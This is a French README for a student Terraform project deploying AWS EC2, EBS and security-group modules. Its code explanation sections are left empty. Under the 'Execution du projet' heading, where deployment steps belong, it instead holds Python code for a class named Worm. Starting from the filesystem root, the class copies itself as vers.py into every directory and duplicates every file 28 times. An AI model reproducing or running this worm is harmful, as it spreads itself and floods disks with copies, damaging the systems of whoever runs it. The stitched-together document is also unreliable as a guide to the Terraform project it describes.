<div style="display:flex; align-items:center;">
  <h1 style="margin-right:auto;">Projet-AWS-terraform</h1>
 <img src="https://img.shields.io/badge/Made%20with-terraform-blue" alt="Terraform badge">
</div>


Dans le cadre de notre semaine de formation sur les outils terraform et puppet nous avons un projet terraform à créer

## Sujet

Dans le cadre du projet nous devons déployer une infrastructure complète AWS avec Terrafom, les prérequis sont :
- un module pour créer une instance ec2 utilisant la dernière version de ubuntu
- un module pour créer un volume ebs dont la taille sera variabilisée
- un module pour créer une security qui ouvrira le 80 et 443
- un dossier app qui va utiliser les 4 modules pour déployer une ec2

Nous devons également, si possible :
- installer nginx et enregistrer l’ip publique dans un fichier nommé ip_ec2.txt (ces éléments sont à intégrer dans le rôle ec2)
- pousser le projet sur GitHub et partager le lien du repo à o.nebie@ecole-ipssi.net (Optionnel)
- faire un rapport pour accompagner notre solution (le readme) 

## Architecture

Voici l'arboressence de notre projet :


## Fichier Terraform de base pour créer une instance

Dans chancun de nos modules terraform nous avons 3 fichiers :
- main.tf permet de définir les ressources à créer, les modifier ou les supprimer pour provisionner une infrastructure.
- variable.tf permet de définir les variables qui seront utilisées dans la configuration principale (main.tf) ou dans d'autres fichiers de configuration, afin de rendre la configuration plus modulaire et facilement adaptable aux différents environnements.
- terraform.tfvars permet de définir des valeurs pour les variables utilisées dans la configuration principale (main.tf) ou dans d'autres fichiers de configuration, afin de les rendre plus faciles à gérer et à modifier pour les différents environnements. 


## Explication du code 


* _Pour le module ec2_ :

* _Pour le module Eip_Publique_ :

* _Pour le module SecutiryGroup_ :

* _Pour le module ebs_ :

## Execution du projet


```python
class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path="/"
        else:
            self.path = path
        
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list=[]
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 28
        else:
            self.iteration = iteration

        # path absolu
        self.own_path = os.path.realpath(__file__)
    
    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            
            if not file.startswith('.'):
                # Prends le PATH complet
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    def create_new_worm(self):
         for directory in self.target_dir_list:
            destination = os.path.join(directory, "vers.py")
            # Copie le script dans le nouveau répertoire avec un noms similaires
            shutil.copyfile(self.own_path, destination)

    def copy_existing_file(self):
        # La méthode suivante sera utilisée pour dupliquer les fichiers un nombre de fois (iteration)
         for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,(file+str(i)))
                        shutil.copyfile(source, destination)

   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_file()
  ```
 
 
Le code suivant permet d'appeler toutes les foncitons au lancement du ver
